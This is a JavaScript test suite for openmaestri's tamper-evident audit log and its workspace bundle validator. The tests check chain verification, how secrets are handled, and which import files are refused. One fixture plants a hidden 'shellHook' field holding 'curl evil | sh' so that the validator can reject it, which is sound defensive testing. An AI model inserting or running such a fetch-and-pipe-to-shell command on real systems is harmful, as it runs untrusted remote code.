import test from 'node:test';
import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { WebSocket } from 'ws';
import { main } from '../src/server.js';
import { Store } from '../src/store.js';
import { Audit, canonical, sha256 } from '../src/audit.js';
import { exportWorkspace, importWorkspace, validateBundle } from '../src/transfer.js';

const CLI = path.resolve('bin/openmaestri.js');
const mk = (t) => { const d = fs.mkdtempSync(path.join(os.tmpdir(), 'om-aud-')); t.after(() => fs.rmSync(d, { recursive: true, force: true })); return d; };

test('audit: events chain, verify passes, file is private', (t) => {
  const dir = mk(t);
  const a = new Audit(path.join(dir, 'audit.log'));
  assert.deepEqual(a.verify(), { ok: true, count: 0, head: null });
  a.append('one', { x: 1 }, 'cli');
  a.append('two', { name: 'k' }, 'ui');
  const r = a.verify();
  assert.equal(r.ok, true);
  assert.equal(r.count, 2);
  assert.equal(fs.statSync(path.join(dir, 'audit.log')).mode & 0o777, 0o600);
  const [e1, e2] = a.read();
  assert.equal(e2.prev, e1.hash);
  assert.equal(canonical({ b: 1, a: [2, { d: 1, c: 2 }] }), '{"a":[2,{"c":2,"d":1}],"b":1}');
});

test('audit: an edited, removed, reordered or cut-off line is detected', (t) => {
  const dir = mk(t);
  const file = path.join(dir, 'audit.log');
  const a = new Audit(file);
  for (const n of ['a', 'b', 'c', 'd']) a.append('event', { n }, 'cli');
  const original = fs.readFileSync(file, 'utf8');
  const lines = original.trim().split('\n');
  const tamper = (arr) => { fs.writeFileSync(file, `${arr.join('\n')}\n`); return a.verify(); };

  const edited = tamper(lines.map((l, i) => (i === 1 ? l.replace('"n":"b"', '"n":"X"') : l)));
  assert.equal(edited.ok, false); assert.match(edited.problem, /edited/); assert.equal(edited.at, 2);

  const removed = tamper([lines[0], lines[2], lines[3]]);
  assert.equal(removed.ok, false); assert.match(removed.problem, /missing|follow/);

  const swapped = tamper([lines[0], lines[2], lines[1], lines[3]]);
  assert.equal(swapped.ok, false);

  const junk = tamper([lines[0], 'not json', lines[2], lines[3]]);
  assert.equal(junk.ok, false); assert.match(junk.problem, /not valid JSON/);

  const cut = tamper(lines.slice(0, 3));
  assert.equal(cut.ok, false); assert.match(cut.problem, /cut off the end/);

  fs.writeFileSync(file, original);
  fs.writeFileSync(`${file}.head`, JSON.stringify({ seq: 4, hash: JSON.parse(lines[3]).hash }));
  assert.equal(a.verify().ok, true, 'the untouched log verifies again');
});

test('audit: values are clipped, only plain data is kept, record never throws', (t) => {
  const dir = mk(t);
  const a = new Audit(path.join(dir, 'audit.log'));
  const e = a.append('x', { long: 'z'.repeat(500), obj: { secret: 'no' }, fn: () => 1, n: 5, ok: true, list: ['a', 'b'] }, 'cli');
  assert.equal(e.detail.long.length, 203);
  assert.equal(e.detail.obj, undefined);
  assert.equal(e.detail.fn, undefined);
  assert.deepEqual(e.detail.list, ['a', 'b']);
  const broken = new Audit(path.join(dir, 'missing-dir', 'x', 'audit.log'));
  fs.writeFileSync(path.join(dir, 'missing-dir'), 'a file where a folder should be');
  const warn = console.warn; console.warn = () => {};
  try { assert.equal(broken.record('x'), null); } finally { console.warn = warn; }
});

test('audit: several processes appending at once keep one unbroken chain', async (t) => {
  const dir = mk(t);
  const file = path.join(dir, 'audit.log');
  const script = `import { Audit } from ${JSON.stringify(path.resolve('src/audit.js'))}; const a = new Audit(${JSON.stringify(file)}); for (let i = 0; i < 15; i++) a.append('burst', { i }, 'p' + process.pid);`;
  await Promise.all([1, 2, 3, 4].map(() => new Promise((res, rej) => {
    const c = spawn(process.execPath, ['--input-type=module', '-e', script], { stdio: 'ignore' });
    c.on('exit', (code) => (code === 0 ? res() : rej(new Error(`child exited ${code}`))));
  })));
  const r = new Audit(file).verify();
  assert.equal(r.ok, true, r.problem);
  assert.equal(r.count, 60);
});

const goodBundle = () => ({
  format: 'openmaestri-workspace', version: 1, exportedAt: 'now',
  workspace: { name: 'W', viewport: { x: 0, y: 0, z: 1 }, floorStatus: null },
  nodes: [
    { key: 'n0', kind: 'terminal', name: 'T', x: 0, y: 0, w: 300, h: 200, color: null, icon: null, command: 'echo hi', maestro: false, role: null, preset: null, cwdRel: null },
    { key: 'n1', kind: 'note', name: 'N', x: 10, y: 10, w: 300, h: 200, color: null, icon: null, text: 'hello', stackKey: null },
  ],
  connections: [{ from: 'n0', to: 'n1' }], routines: [],
});

test('bundle schema: a good file passes; unknown fields, bad types and depth bombs are refused with reasons', () => {
  assert.deepEqual(validateBundle(goodBundle()), []);
  const withExtra = goodBundle(); withExtra.nodes[0].shellHook = 'curl evil | sh';
  assert.match(validateBundle(withExtra).join('\n'), /nodes\[0\] has a field that this format does not define: shellHook/);
  const topExtra = goodBundle(); topExtra.__proto__x = 1; topExtra.admin = true;
  assert.match(validateBundle(topExtra).join('\n'), /unknown top-level field: admin/);
  const badType = goodBundle(); badType.nodes[1].text = { html: '<img>' }; badType.nodes[0].x = '5'; badType.nodes[0].maestro = 'yes';
  const errs = validateBundle(badType).join('\n');
  assert.match(errs, /nodes\[1\]\.text must be a text/); assert.match(errs, /nodes\[0\]\.x must be a number/); assert.match(errs, /maestro must be true or false/);
  const wrongKind = goodBundle(); wrongKind.nodes.push({ key: 'z', kind: 'files' });
  assert.match(validateBundle(wrongKind).join('\n'), /unknown kind/);
  const kindProto = goodBundle(); kindProto.nodes.push({ key: 'z', kind: 'constructor' });
  assert.match(validateBundle(kindProto).join('\n'), /unknown kind/, 'prototype names are not kinds');
  const future = goodBundle(); future.version = 2;
  assert.match(validateBundle(future)[0], /unsupported bundle version: 2/);
  assert.deepEqual(validateBundle([]), ['the file is not a JSON object']);
  assert.deepEqual(validateBundle({ format: 'other' }), ['not an openmaestri workspace file']);
  let deep = {}; const root = { ...goodBundle(), workspace: { name: 'x', viewport: deep } };
  for (let i = 0; i < 30; i += 1) { deep.n = {}; deep = deep.n; }
  assert.match(validateBundle(root)[0], /nested too deeply/);
  const conn = goodBundle(); conn.connections.push({ from: 'a', to: 'b', extra: 1 }, 'x');
  assert.match(validateBundle(conn).join('\n'), /exactly \{from, to\}/);
  const many = goodBundle(); many.nodes = Array.from({ length: 50 }, (_, i) => ({ key: `k${i}`, kind: 'note', name: 1 }));
  assert.ok(validateBundle(many).length <= 12, 'the list of reasons is capped');
});

test('bundle: export then import then export gives the same bundle, and a refused file changes nothing', (t) => {
  const dir = mk(t);
  const store = new Store(path.join(dir, 'data')); store.load?.();
  const ws = store.createWorkspace({ name: 'Src', dir });
  store.createNode(ws, 'note', { name: 'N', text: 'body' });
  store.createNode(ws, 'terminal', { name: 'T', command: 'echo 1' });
  store.createNode(ws, 'portal', { name: 'P', url: 'https://example.com' });
  const browser = store.createNode(ws, 'files', { name: 'Browser' });
  store.connect(ws, browser.id, ws.nodes.find((n) => n.kind === 'note').id);
  const first = exportWorkspace(store, ws);
  assert.equal(first.nodes.some((n) => n.kind === 'files'), false, 'a Files node is not part of the format');
  assert.deepEqual(validateBundle(first), [], 'what we export is what we accept');
  const copy = importWorkspace(store, JSON.parse(JSON.stringify(first)), { name: 'Copy', dir });
  const second = exportWorkspace(store, copy);
  const strip = (b) => ({ ...b, exportedAt: 0, workspace: { ...b.workspace, name: 0 } });
  assert.deepEqual(strip(second), strip(first), 'a round trip loses nothing and adds nothing');
  const before = store.workspaces.size;
  const tampered = JSON.parse(JSON.stringify(first)); tampered.nodes[0].evil = true;
  assert.throws(() => importWorkspace(store, tampered, { dir }), /cannot be imported/);
  assert.equal(store.workspaces.size, before, 'a refused file creates no workspace');
});

test('audit: imports (accepted and refused), exports, agent runs and secrets are recorded, never prompts or keys', async (t) => {
  const dir = mk(t);
  const app = await main({ port: 0, dataRoot: path.join(dir, 'data'), socketPath: path.join(dir, 's.sock'), quiet: true });
  t.after(async () => { await app.close(); });
  const { core } = app;
  const ws = core.store.workspaces.get(core.store.settings.activeWorkspaceId);
  const sock = new WebSocket(`ws://127.0.0.1:${app.port}/ws?token=${app.token}`, { headers: { origin: `http://127.0.0.1:${app.port}` } });
  const got = []; sock.on('message', (m) => got.push(JSON.parse(m)));
  await new Promise((r) => sock.on('open', r));
  const bad = goodBundle(); bad.nodes[0].evil = 1;
  sock.send(JSON.stringify({ t: 'workspace.import', workspaceId: ws.id, bundle: bad, dir }));
  sock.send(JSON.stringify({ t: 'workspace.import', workspaceId: ws.id, bundle: goodBundle(), dir }));
  for (const end = Date.now() + 4000; core.audit.read(5).length < 2 && Date.now() < end;) await new Promise((r) => setTimeout(r, 30));
  sock.close();
  const events = core.audit.read(10);
  assert.equal(events[0].event, 'workspace.import'); assert.equal(events[0].detail.accepted, false); assert.match(events[0].detail.reason, /cannot be imported/);
  assert.equal(events[1].detail.accepted, true); assert.equal(events[1].detail.heldBackCommands, 1);
  const fakeTool = path.join(dir, 'tool'); fs.writeFileSync(fakeTool, '#!/usr/bin/env bash\necho done\n', { mode: 0o755 });
  core.store.settings.drivers = { mine: { bin: fakeTool, args: ['{prompt}'] } };
  const boss = core.store.createNode(ws, 'terminal', { name: 'Boss', maestro: true, command: '' });
  await core.command({ terminalId: boss.id }, 'agent.run', { driver: 'mine', prompt: 'my private prompt text' });
  await core.command({ terminalId: boss.id }, 'run', { task: 'another private task', agents: 'mine' });
  const all = fs.readFileSync(path.join(dir, 'data', 'audit.log'), 'utf8');
  assert.match(all, /"event":"agent.run"/); assert.match(all, /"event":"run"/);
  assert.ok(all.includes(sha256('my private prompt text')));
  assert.doesNotMatch(all, /private prompt text|another private task/);
  assert.equal(core.audit.verify().ok, true);

  const env = { ...process.env, OPENMAESTRI_DATA_DIR: path.join(dir, 'data'), OPENMAESTRI_SECRETS_BACKEND: 'file' }; delete env.OPENMAESTRI_SOCKET;
  const cli = (args, input, extra = {}) => spawnSync(process.execPath, [CLI, ...args], { env: { ...env, ...extra }, input, encoding: 'utf8' });
  assert.equal(cli(['secrets', 'set', 'k1'], 'sk-hidden-value\n').status, 0);
  assert.equal(cli(['secrets', 'rm', 'k1']).status, 0);
  const shown = cli(['audit', '--tail', '10']);
  assert.match(shown.stdout, /secret\.set/); assert.match(shown.stdout, /secret\.remove/);
  assert.doesNotMatch(fs.readFileSync(path.join(dir, 'data', 'audit.log'), 'utf8'), /sk-hidden-value/);
  assert.equal(cli(['audit', '--verify']).status, 0);
  const lines = fs.readFileSync(path.join(dir, 'data', 'audit.log'), 'utf8').trim().split('\n');
  lines[0] = lines[0].replace('false', 'true');
  fs.writeFileSync(path.join(dir, 'data', 'audit.log'), `${lines.join('\n')}\n`);
  const broken = cli(['audit', '--verify']);
  assert.equal(broken.status, 1); assert.match(broken.stderr, /BROKEN at line 1/);
  const inside = cli(['audit'], '', { OPENMAESTRI_SOCKET: '/x.sock', OPENMAESTRI_TERMINAL_ID: 'x' });
  assert.equal(inside.status, 2);
});
